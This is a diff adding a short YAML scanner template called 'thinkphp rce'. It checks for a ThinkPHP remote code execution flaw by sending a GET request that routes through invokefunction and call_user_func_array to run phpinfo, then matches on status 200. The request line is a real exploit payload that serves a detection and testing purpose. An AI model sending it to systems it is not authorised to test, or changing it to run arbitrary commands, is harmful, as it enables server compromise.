@@ -1,0 +1,9 @@
+name: thinkphp rce
+rules:
+    method: GET
+    path: /index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=1
+    status: 200
+    contains: 4
+details: 
+    links: test
+    author: test
